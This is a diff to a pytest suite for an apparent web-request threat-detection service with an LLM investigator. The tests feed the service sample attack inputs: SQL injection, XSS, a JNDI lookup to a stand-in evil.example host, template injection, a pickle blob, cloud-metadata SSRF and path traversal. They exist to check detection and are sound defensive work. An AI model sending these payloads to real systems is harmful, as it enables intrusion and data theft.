@@ -2,14 +2,27 @@
 
 from __future__ import annotations
 
+import base64
 import json
 from pathlib import Path
 
 import numpy as np
 import pytest
 
-from app.agent_worker import MitigationPolicy, build_messages, normalize_threat_type, parse_verdict
-from app.ml_filter import FastFilter, heuristic_template
+import asyncio
+
+import httpx
+
+from app.agent_worker import (
+    LLMError,
+    MetaModelClient,
+    MitigationPolicy,
+    build_messages,
+    investigate,
+    normalize_threat_type,
+    parse_verdict,
+)
+from app.ml_filter import FastFilter, describe_decodings, heuristic_template
 from app.models import Action, AgentVerdict, FastVerdict, RequestFeatures, SuspiciousRequest, Tier
 from app.rag_engine import (
     OpenAPIError,
@@ -85,6 +98,39 @@ def test_injection_is_suspicious_not_hard_blocked(ff: FastFilter) -> None:
     v = verdict_for(ff, "POST", "/login", body=b'{"user":"admin\' OR 1=1 --"}')
     assert v.tier is Tier.SUSPICIOUS
     assert v.threat_hint == "injection"
+
+
+@pytest.mark.parametrize(
+    ("query", "body", "headers"),
+    [
+        ("q=%3Cimg%20src%3Dx%20onmouseover%3Dalert(1)%3E", b"", None),
+        ("q=${lower:j}ndi:ldap://evil.example/a", b"", None),
+        ("user=alice%0aINFO+admin+logged+in", b"", None),
+        ("", b'{"note":"{{7*7}}"}', None),
+        ("", b'{"blob":"gASVBAAAAAAAAACMCGJ1aWx0aW5z"}', None),
+        ("url=http://169.254.169.254/latest/meta-data/", b"", None),
+        ("", b"", {"cookie": "session=gASVBAAAAAAAAACMCG=="}),
+    ],
+)
+def test_new_attack_families_are_suspicious_not_hard_blocked(
+    ff: FastFilter, query: str, body: bytes, headers: dict[str, str] | None
+) -> None:
+    v = verdict_for(ff, "POST", "/api/comments", query, body, headers=headers)
+    assert v.tier is Tier.SUSPICIOUS
+    assert v.tier is not Tier.HARD_BLOCK
+
+
+def test_newline_in_free_text_body_is_not_a_hard_block(ff: FastFilter) -> None:
+    v = verdict_for(ff, "POST", "/api/comments", body=b'{"order_id":1,"text":"hello\nplease leave it at the door"}')
+    assert v.tier is not Tier.HARD_BLOCK
+    assert v.threat_hint != "log_forging"
+
+
+def test_describe_decodings_returns_text_and_does_not_execute() -> None:
+    encoded = base64.b64encode(b"os.system('id')").decode()
+    text = describe_decodings(encoded)
+    assert "base64: os.system('id')" in text
+    assert describe_decodings("%2e%2e%2fetc%2fpasswd").splitlines()[0].endswith("../etc/passwd")
 
 
 def test_schema_violation_and_bola_signals(ff: FastFilter) -> None:
@@ -256,6 +302,164 @@ def _ctx(findings: list[str] | None = None) -> RagContext:
     return RagContext(True, "/api/orders/{orderId}", findings or ["matches declared operation"], [], [])
 
 
+def test_empty_model_message_is_resent_up_to_three_times() -> None:
+    calls = {"n": 0}
+
+    def handler(request: httpx.Request) -> httpx.Response:
+        calls["n"] += 1
+        content = "" if calls["n"] < 3 else "sentinel-ok"
+        return httpx.Response(200, json={"choices": [{"message": {"role": "assistant", "content": content}}]})
+
+    async def run() -> str:
+        client = MetaModelClient(
+            api_key="test",
+            base_url="http://llm.test/v1",
+            model="muse-spark-1.3",
+            max_retries=2,
+            transport=httpx.MockTransport(handler),
+        )
+        try:
+            return await client.complete([{"role": "user", "content": "ping"}])
+        finally:
+            await client.aclose()
+
+    assert asyncio.run(run()) == "sentinel-ok"
+    assert calls["n"] == 3
+
+
+_VERDICT_JSON = '{"is_malicious": true, "confidence_score": 0.91, "threat_type": "injection", "reasoning": "stacked sql"}'
+_CHAIN = "request: post\nschema: declared\ntechnique: sql\nconclusion: malicious"
+
+
+def test_investigate_stops_after_two_tool_calls() -> None:
+    class FakeModel:
+        def __init__(self) -> None:
+            self.calls = 0
+
+        async def chat(self, messages, tools=None, tool_choice=None):
+            self.calls += 1
+            last = str(messages[-1].get("content") or "")
+            if "ONLY one JSON" in last or "not a verdict" in last:
+                return {"content": _VERDICT_JSON}
+            if tools is not None and self.calls <= 2:
+                name = "search_threats" if self.calls == 1 else "get_endpoint"
+                arguments = '{"query": "DROP TABLE"}' if name == "search_threats" else '{"method": "POST", "path": "/api/tickets"}'
+                return {"content": "", "tool_calls": [{"id": f"t{self.calls}", "type": "function", "function": {"name": name, "arguments": arguments}}]}
+            return {"content": _CHAIN}
+
+    class StubRag:
+        def search_threats(self, query: str, k: int = 3) -> list[str]:
+            return [f"sql doc for {query}"]
+
+        def describe_endpoint(self, method: str, path: str) -> list[str]:
+            return [f"{method} {path}"]
+
+    model = FakeModel()
+    verdict, _raw, trace, error, chain = asyncio.run(investigate(model, StubRag(), [{"role": "user", "content": "check"}]))
+    assert error is None
+    assert verdict.is_malicious
+    assert chain == _CHAIN
+    assert trace == ['search_threats:{"query": "DROP TABLE"}', 'get_endpoint:{"method": "POST", "path": "/api/tickets"}']
+    assert model.calls == 4
+
+
+def test_investigate_stops_after_three_tool_calls() -> None:
+    class FakeModel:
+        def __init__(self) -> None:
+            self.calls = 0
+
+        async def chat(self, messages, tools=None, tool_choice=None):
+            self.calls += 1
+            last = str(messages[-1].get("content") or "")
+            if "ONLY one JSON" in last or "not a verdict" in last:
+                return {"content": _VERDICT_JSON}
+            if tools is None:
+                return {"content": _CHAIN}
+            names = ("decode_value", "search_threats", "get_endpoint")
+            name = names[min(self.calls, 3) - 1]
+            if name == "decode_value":
+                arguments = '{"value": "%2e%2e%2fetc%2fpasswd"}'
+            elif name == "search_threats":
+                arguments = '{"query": "template expression"}'
+            else:
+                arguments = '{"method": "POST", "path": "/api/tickets"}'
+            return {
+                "content": "",
+                "tool_calls": [{"id": f"t{self.calls}", "type": "function", "function": {"name": name, "arguments": arguments}}],
+            }
+
+    class StubRag:
+        def search_threats(self, query: str, k: int = 3) -> list[str]:
+            return [f"doc {query}"]
+
+        def describe_endpoint(self, method: str, path: str) -> list[str]:
+            return [f"{method} {path}"]
+
+    model = FakeModel()
+    verdict, _raw, trace, error, _chain = asyncio.run(investigate(model, StubRag(), [{"role": "user", "content": "check"}]))
+    assert error is None and verdict.is_malicious
+    assert len(trace) == 3
+    assert trace[0].startswith("decode_value:")
+    assert model.calls == 5
+
+
+def test_investigate_corrects_a_non_json_verdict() -> None:
+    class FakeModel:
+        def __init__(self) -> None:
+            self.calls = 0
+
+        async def chat(self, messages, tools=None, tool_choice=None):
+            self.calls += 1
+            if tools is not None:
+                return {"content": _CHAIN}
+            if self.calls == 2:
+                return {"content": "I think this is bad."}
+            return {"content": _VERDICT_JSON}
+
+    class StubRag:
+        def search_threats(self, query: str, k: int = 3) -> list[str]:
+            return []
+
+        def describe_endpoint(self, method: str, path: str) -> list[str]:
+            return []
+
+    verdict, _raw, _trace, error, chain = asyncio.run(investigate(FakeModel(), StubRag(), [{"role": "user", "content": "check"}]))
+    assert error is None
+    assert verdict.confidence_score == 0.91
+    assert chain == _CHAIN
+
+
+def test_investigate_falls_back_when_the_model_never_answers() -> None:
+    class DeadModel:
+        async def chat(self, messages, tools=None, tool_choice=None):
+            raise LLMError("model call failed after 3 attempts: empty")
+
+    class StubRag:
+        def search_threats(self, query: str, k: int = 3) -> list[str]:
+            return []
+
+        def describe_endpoint(self, method: str, path: str) -> list[str]:
+            return []
+
+    hard, _raw, _trace, error, _chain = asyncio.run(
+        investigate(DeadModel(), StubRag(), [{"role": "user", "content": "check"}], req=_req(Tier.HARD_BLOCK))
+    )
+    assert error is not None and error.startswith("fallback:")
+    assert hard.recommended_action == "block"
+    assert hard.confidence_score == 0.95
+    policy = MitigationPolicy(block_confidence=0.85, critical_confidence=0.7)
+    action, _ = policy.decide(hard, _req(Tier.HARD_BLOCK), _ctx())
+    assert action is Action.BLOCKLISTED
+
+    soft, _raw, _trace, error, _chain = asyncio.run(
+        investigate(DeadModel(), StubRag(), [{"role": "user", "content": "check"}], req=_req(Tier.SUSPICIOUS))
+    )
+    assert error is not None and error.startswith("fallback:")
+    assert soft.confidence_score == 0.55
+    action, _ = policy.decide(soft, _req(Tier.SUSPICIOUS), _ctx())
+    assert action is Action.ALERT
+
+
 @pytest.mark.parametrize(
     ("verdict", "findings", "tier", "expected"),
     [
@@ -263,7 +467,15 @@ def _ctx(findings: list[str] | None = None) -> RagContext:
         (AgentVerdict(is_malicious=False, confidence_score=0.9), None, Tier.SUSPICIOUS, Action.IGNORED),
         (AgentVerdict(is_malicious=True, confidence_score=0.9, threat_type="other"), None, Tier.SUSPICIOUS, Action.BLOCKLISTED),
         (AgentVerdict(is_malicious=True, confidence_score=0.75, threat_type="bola"), None, Tier.SUSPICIOUS, Action.BLOCKLISTED),
+        (AgentVerdict(is_malicious=True, confidence_score=0.75, threat_type="xss"), None, Tier.SUSPICIOUS, Action.BLOCKLISTED),
+        (AgentVerdict(is_malicious=True, confidence_score=0.75, threat_type="log_forging"), None, Tier.SUSPICIOUS, Action.ALERT),
         (AgentVerdict(is_malicious=True, confidence_score=0.75, threat_type="other"), None, Tier.SUSPICIOUS, Action.ALERT),
+        (
+            AgentVerdict(is_malicious=True, confidence_score=0.65, threat_type="api_intrusion"),
+            ["method not declared for /api/files; allowed: GET"],
+            Tier.SUSPICIOUS,
+            Action.BLOCKLISTED,
+        ),
         (
             AgentVerdict(is_malicious=True, confidence_score=0.75, threat_type="mass_assignment"),
             ["undeclared body fields (possible mass assignment): role"],
